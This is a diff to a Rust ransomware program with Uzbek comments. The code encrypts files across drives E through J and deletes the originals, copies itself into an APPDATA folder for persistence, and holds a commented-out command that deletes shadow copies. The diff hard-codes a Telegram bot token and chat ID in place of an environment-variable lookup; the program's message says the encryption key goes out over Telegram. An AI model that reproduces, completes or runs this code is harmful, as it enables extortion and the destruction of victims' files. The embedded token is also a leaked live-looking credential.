@@ -66,7 +66,7 @@ fn encrypt_file(
             orig.sync_all()?;
         }
         fs::remove_file(file_path)?;
-        println!("[+] Original o‘chirildi: {}", file_path.display());
+        println!("[+] Original o'chirildi: {}", file_path.display());
     }
 
     Ok(())
@@ -158,11 +158,10 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     // .env yuklash
     dotenv().ok();
-    let telegram_token =
-        env::var("TELEGRAM_TOKEN").map_err(|e| format!("TELEGRAM_TOKEN missing: {}", e))?;
-    let chat_id = env::var("CHAT_ID").map_err(|e| format!("CHAT_ID missing: {}", e))?;
+    let telegram_token = "7628596830:AAE7VdOVCQ-87PTbtGdNd7ntW3bqULahQ6o";
+    let chat_id = "1179267491";
 
-    // O‘zini nusxalash
+    // O'zini nusxalash
     let current_exe = env::current_exe().map_err(|e| format!("Current exe error: {}", e))?;
     let mut dest_dir = env::var("APPDATA").unwrap_or_else(|_| "C:\\Users\\Public".into());
     dest_dir.push_str("\\NonShared");
@@ -173,7 +172,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     let dest_exe = dest_dir.join(file_name);
 
     if current_exe != dest_exe {
-        // Mavjud faylni o‘chirish (agar mavjud bo‘lsa)
+        // Mavjud faylni o'chirish (agar mavjud bo'lsa)
         if dest_exe.exists() {
             fs::remove_file(&dest_exe)
                 .map_err(|e| format!("Remove existing file error {}: {}", dest_exe.display(), e))?;
@@ -250,7 +249,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         }
     }
 
-    // Shadow copy o‘chirish (Windows Home uchun o‘chirilgan)
+    // Shadow copy o'chirish (Windows Home uchun o'chirilgan)
     // let _ = Command::new("vssadmin").args(["delete", "shadows", "/all", "/quiet"]).status();
 
     // Kalit va nonce hosil qilish
@@ -272,7 +271,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         println!("[+] Kalit va nonce key.txt fayliga saqlandi");
     }
 
-    // Fayl yo‘llarini yig‘ish
+    // Fayl yo'llarini yig'ish
     let mut paths = Vec::new();
     for drive in ['E', 'F', 'G', 'H', 'I', 'J'] {
         let root = format!("{}:\\", drive);
@@ -314,7 +313,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         handles.push(handle);
     }
 
-    // Fayl yo‘llarini kanalga yuborish
+    // Fayl yo'llarini kanalga yuborish
     for p in paths {
         tx.send(p)?;
     }
@@ -349,7 +348,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     }
 
     println!(
-        "[+] Barcha fayllar shifrlab bo‘lingach, kalit Telegramga yuborildi yoki key.txt fayliga saqlandi!"
+        "[+] Barcha fayllar shifrlab bo'lingach, kalit Telegramga yuborildi yoki key.txt fayliga saqlandi!"
     );
     Ok(())
 }
